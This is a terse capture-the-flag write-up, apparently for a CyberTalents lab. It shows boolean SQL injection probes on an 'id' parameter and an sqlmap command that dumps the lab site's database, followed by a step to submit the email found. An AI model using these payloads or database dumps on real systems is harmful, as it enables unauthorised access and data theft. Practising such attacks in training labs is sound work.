- sql injection in id parameter

  ```
  ?id=1 AND 4896=4896
  ?id=1 AND 4896=489
  ```
  ```
  sqlmap -u wcamxwl32pue3e6mk873oykcwzy01y3eq9ypfx3m-web.cybertalentslabs.com/shownews.php?id=1 -dump
  ```
- then submit the email
